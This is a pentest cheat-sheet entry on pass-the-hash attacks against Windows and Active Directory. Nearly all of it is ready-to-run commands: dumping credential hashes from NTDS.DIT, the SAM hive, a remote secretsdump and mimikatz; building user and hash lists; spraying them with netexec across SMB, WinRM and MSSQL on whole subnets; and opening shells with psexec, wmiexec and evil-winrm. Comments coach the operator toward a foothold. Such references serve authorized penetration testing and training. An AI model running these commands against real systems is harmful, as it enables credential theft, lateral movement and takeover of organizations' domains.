title: Pass the Hash
body: Got NTLM hash but no plaintext password? PTH with impacket tools or CrackMapExec. Requires LocalAccountTokenFilterPolicy=1 for local accounts over network logons.
cmd:
# ══════════════════════════════════════════════════
# ⭐⭐ EASIEST — parse_ntds.py (one command does it all)
# ══════════════════════════════════════════════════
# Dump to a file, then run the parser — it writes aligned users/nt files
# AND prints the exact spray command with your DC IP filled in:
impacket-secretsdump -ntds NTDS.DIT -system SYSTEM LOCAL > dump.txt
python3 parse_ntds.py dump.txt --dc <DC-ip>
# → dump_users.txt + dump_nt.txt (aligned), dump_ref.txt, dump_crack.txt
# → prints:  nxc smb <DC> -u dump_users.txt -H dump_nt.txt --no-bruteforce ...
# Just copy the printed spray command and run it. Done.

# ══════════════════════════════════════════════════
# ⭐ MANUAL WORKFLOW — if parse_ntds.py isn't handy
# (you have NTDS.DIT + SYSTEM from a backup/shadow copy)
# ══════════════════════════════════════════════════
# 1. DUMP all domain hashes to a file:
impacket-secretsdump -ntds NTDS.DIT -system SYSTEM LOCAL > dump.txt

# 2. Make TWO aligned files (same grep = same order, line-for-line):
grep ':::' dump.txt | grep -v '\$' | cut -d: -f1 > users.txt   # usernames
grep ':::' dump.txt | grep -v '\$' | cut -d: -f4 > nt.txt      # NT hashes
#    field 1 = username, field 4 = NT hash. grep -v '\$' drops COMPUTER$ accts.

# 3. Sanity-check they line up (user next to its hash):
paste users.txt nt.txt

# 4. SPRAY — pass-the-hash, user[n] with hash[n]:
nxc smb <DC-ip> -u users.txt -H nt.txt --no-bruteforce --continue-on-success
#    --no-bruteforce  = pair line-by-line (NOT every user x every hash)
#    --continue-on-success = keep going after the first hit

# 5. READ THE RESULTS:
#    [+] user           = hash VALID → this account is a foothold
#    (Pwn3d!)           = VALID + local admin → jackpot
#    STATUS_LOGON_FAILURE   = stale hash (backup predates a password change)
#    STATUS_PASSWORD_EXPIRED= account valid but forced to reset — can't use directly
#    STATUS_ACCOUNT_DISABLED= dead account, ignore

# 6. On any [+] user — get a shell and enumerate:
evil-winrm -i <DC-ip> -u <user> -H <that-users-hash>
nxc ldap <DC-ip> -u <user> -H <hash> --bloodhound --collection All --dns-server <DC-ip>

# ── WHY MANY FAIL: a backup NTDS is a SNAPSHOT. Administrator + most users
#    may have changed passwords since (stale/expired). But 1-2 accounts almost
#    always still have valid hashes — those are your way in. Don't stop at
#    Administrator failing; spray the WHOLE list.

# ── DUMP HASHES FIRST ────────────────────────────────
# Via SAM (needs SYSTEM)
reg save HKLM\sam sam
reg save HKLM\system system
impacket-secretsdump -sam sam -system system local

# Via secretsdump remote (needs admin creds)
impacket-secretsdump administrator:password@$ip

# Via mimikatz
sekurlsa::logonpasswords

# ── PASS THE HASH ─────────────────────────────────────
# impacket-psexec
impacket-psexec Administrator@$ip -hashes :NTLMHASH

# impacket-wmiexec
impacket-wmiexec Administrator@$ip -hashes :NTLMHASH

# nxc (netexec) — CrackMapExec successor
nxc smb $ip -u Administrator -H NTLMHASH
nxc smb $ip -u Administrator -H NTLMHASH --exec-method smbexec

# evil-winrm
evil-winrm -i $ip -u Administrator -H NTLMHASH

# ── LOCALACCOUNTTOKENFILTERPOLICY ─────────────────────
# If PTH fails for local admin over network:
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy
# Must be 1 for local accounts to PTH over SMB/WinRM

# --- smbclient directly with an NT hash ---
smbclient \\\\<IP>\\<SHARE> -U <USER> --pw-nt-hash <NTHASH>

# evil-winrm Pass-the-Hash
evil-winrm -i <IP> -u <USER> -H <NTHASH>
# No Pwn3d! from nxc does NOT mean no WinRM access.
# WinRM is granted by Remote Management Users group, invisible to a Pwn3d! check.
# Always try evil-winrm -H even when nxc shows no (Pwn3d!).

# Hash spray — users.txt + hashes.txt across services
nxc smb <SUBNET>/24 -u users.txt -H hashes.txt --continue-on-success | grep Pwn3d
nxc winrm <SUBNET>/24 -u users.txt -H hashes.txt | grep "[+]"
nxc mssql <SUBNET>/24 -u users.txt -H hashes.txt | grep "[+]"
# Build your lists:
grep ":::" secretsdump_out.txt | cut -d: -f4 | sort -u > hashes.txt
grep ":::" secretsdump_out.txt | cut -d: -f1 | sort -u > users.txt
warn: PTH only works with NTLM hashes, not Net-NTLMv2. Net-NTLMv2 must be cracked or relayed — it cannot be passed directly.
